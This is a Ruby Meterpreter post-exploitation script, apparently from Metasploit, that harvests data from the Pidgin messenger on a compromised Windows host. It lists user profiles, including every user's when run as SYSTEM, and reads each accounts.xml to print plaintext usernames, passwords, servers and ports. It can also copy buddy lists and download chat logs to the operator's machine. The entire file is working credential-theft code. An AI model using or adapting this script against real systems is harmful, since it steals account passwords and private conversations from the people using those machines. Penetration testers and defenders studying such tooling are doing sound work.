# Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-------------------------------------------------------------------------------
require "rexml/document"

#-------------------------------------------------------------------------------
#Options and Option Parsing
opts = Rex::Parser::Arguments.new(
  "-h" => [ false, "Help menu." ],
  "-c" => [ false, "Return credentials." ],
  "-l" => [ false, "Retrieve logs." ],
  "-b" => [ false, "Retrieve buddies." ]
)

get_credentials=false
get_buddies=false
get_logs=false
opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    print_line "Meterpreter Script for extracting configured services with username and passwords."
    print_line(opts.usage)
    raise Rex::Script::Completed
  when "-l"
    get_logs=true
  when "-b"
    get_buddies=true
  when "-c"
    get_credentials=true
  end
}
### If we get here and have none of our flags true, then we'll just
###   get credentials
if !(get_credentials || get_buddies || get_logs)
  get_credentials=true
end

#-------------------------------------------------------------------------------
#Set General Variables used in the script
@client = client
os = @client.sys.config.sysinfo['OS']
host = @client.sys.config.sysinfo['Computer']
# Create Filename info to be appended to downloaded files
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
# Create a directory for the logs
logs = ::File.join(Msf::Config.log_directory,'scripts', 'pidgin_creds')
# Create the log directory
::FileUtils.mkdir_p(logs)
#logfile name
dest = Rex::FileUtils.clean_path(logs + "/" + host + filenameinfo + ".txt")

#-------------------------------------------------------------------------------
#function for checking of Pidgin profile is present
def check_pidgin(path)
  found = nil
  @client.fs.dir.foreach(path) do |x|
    next if x =~ /^(\.|\.\.)$/
    if x =~ (/\.purple/)
      ### If we find the path, let's return it
      found = path + x
      return found
    end
  end
  return found
end

#-------------------------------------------------------------------------------
#function for extracting the buddies
def extract_buddies(path)
  blist_xml = ""
  buddies = ""
  print_status("Reading blist.xml file...")
  ### modified to use pidgin_path, which already has .purple in it
  blist_file = @client.fs.file.new(path + "\\blist.xml", "rb")
  until blist_file.eof?
    blist_xml << blist_file.read
  end
  blist_file.close
  doc = (REXML::Document.new blist_xml).root
  doc.elements["blist"].elements.each("group") {|group|
    group.elements.each("contact") {|contact|
      b_name=contact.elements["buddy"].elements["name"].text + ""
      b_account=contact.elements["buddy"].attributes["account"] + ""
      b_proto=contact.elements["buddy"].attributes["proto"] + ""
      b_alias=""
      if (contact.elements["buddy"].elements["alias"])
        b_alias=contact.elements["buddy"].elements["alias"].text
      end
      buddies << "buddy=>" + b_name + "\talias=>" + b_alias + "\taccount=>" + b_account + ":" + b_proto + "\n"
    }
  }
  return buddies
end

#-------------------------------------------------------------------------------
#function for downloading logs
def download_logs(dest,pidgin_path)
  begin
    stat = client.fs.file.stat(pidgin_path+"\\logs")
    if(stat.directory?)
      print_status("downloading " + pidgin_path +"\\logs to " + dest+"/logs")
      client.fs.dir.download(dest+"/logs", pidgin_path+"\\logs", true)
    end
  rescue
    print_status("Log directory does not exist, loggin is not enabled.")
  end
end

#-------------------------------------------------------------------------------
#function for extracting the credentials
def extract_creds(path)
  accounts_xml = ""
  creds = ""
  print_status("Reading accounts.xml file...")
  ### modified to use pidgin_path, which already has .purple in it
  account_file = @client.fs.file.new(path + "\\accounts.xml", "rb")
  until account_file.eof?
    accounts_xml << account_file.read
  end
  account_file.close
  doc = (REXML::Document.new accounts_xml).root
  doc.elements.each("account") {|element|
    password = "<unknown>"
    if element.elements["password"]
      password=element.elements["password"].text
    end

    print_status("\tProtocol: #{element.elements["protocol"].text}")
    print_status("\tUsername: #{element.elements["name"].text}")
    print_status("\tPassword: #{element.elements["password"].text}")
    print_status("\tServer: #{element.elements["settings"].elements["setting[@name='server']"].text}")
    print_status("\tPort: #{element.elements["settings"].elements["setting[@name='port']"].text}")
    print_status()

    creds << "user=>#{element.elements["name"].text}"
    creds << "\tpass=>#{password}"
    creds << "\tserver=>#{element.elements["settings"].elements["setting[@name='server']"].text}"
    creds << ":#{element.elements["settings"].elements["setting[@name='port']"].text}"
    creds << "\tproto=>#{element.elements["protocol"].text}\n"
  }
  return creds
end
#-------------------------------------------------------------------------------
#Function to enumerate the users if running as SYSTEM
def enum_users(os)
  users = []

  path4users = ""
  sysdrv = @client.fs.file.expand_path("%SystemDrive%")

  if os =~ /Windows 7|Vista|2008/
    path4users = sysdrv + "\\users\\"
    path2purple = "\\AppData\\Roaming\\"
  else
    path4users = sysdrv + "\\Documents and Settings\\"
    path2purple = "\\Application Data\\"
  end

  if is_system?
    print_status("Running as SYSTEM extracting user list..")
    @client.fs.dir.foreach(path4users) do |u|
      userinfo = {}
      next if u =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
      userinfo['username'] = u
      userinfo['userappdata'] = path4users + u + path2purple
      users << userinfo
    end
  else
    userinfo = {}
    uservar = @client.fs.file.expand_path("%USERNAME%")
    userinfo['username'] = uservar
    userinfo['userappdata'] = path4users + uservar + path2purple
    users << userinfo
  end
  return users
end
#-------------------------------------------------------------------------------

################## MAIN ##################
if client.platform =~ /win32|win64/
  print_status("Running Meterpreter Pidgin Credential harvester script")
  print_status("All services are logged at #{dest}")
  enum_users(os).each do |u|
    print_status("Checking if Pidgin profile is present for user :::#{u['username']}:::...")
    ### Find the path (if it exists) for this user,
    pidgin_path = check_pidgin(u['userappdata'])
    if pidgin_path
      print_status("Pidgin profile found!")
      ### modified to use pidgin_path
      if get_credentials
        file_local_write(dest,extract_creds(pidgin_path))
      end
      if get_buddies
        file_local_write(dest,extract_buddies(pidgin_path))
        print_status("Buddie list has been saved to the log file.")
      end
      if get_logs
        download_logs(logs,pidgin_path)
      end
    else
      print_error("Pidgin profile not found!")
    end
  end
else
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end
